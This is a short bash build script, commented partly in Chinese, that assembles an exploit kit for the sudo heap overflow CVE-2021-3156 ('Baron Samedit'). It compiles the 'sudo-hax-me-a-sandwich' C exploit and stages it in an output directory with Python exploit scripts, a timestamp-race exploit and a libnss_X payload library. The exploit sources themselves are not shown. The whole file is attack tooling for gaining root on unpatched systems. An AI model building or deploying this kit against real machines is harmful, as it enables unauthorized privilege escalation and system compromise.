#!/usr/bin/env bash
# 02sudo3165 — CVE-2021-3156 sudo Baron Samedit（Python + C 混合利用集）
# 用法: build.sh <outdir> [gnu|musl]
set -euo pipefail
OUT="${1:?usage: build.sh <outdir> [gnu|musl]}"
cd "$(dirname "$0")/CVE-2021-3156"
mkdir -p "$OUT"
cp -f *.py "$OUT/"
cp -f exploit_timestamp_race.c "$OUT/" 2>/dev/null || true
make clean >/dev/null 2>&1 || true
make CC="${CC:-gcc}"
chmod +x sudo-hax-me-a-sandwich
cp -f sudo-hax-me-a-sandwich "$OUT/" 2>/dev/null || true
cp -rf libnss_X "$OUT/" 2>/dev/null || true
echo "[02sudo3165] -> $OUT/*.py + C exploit"
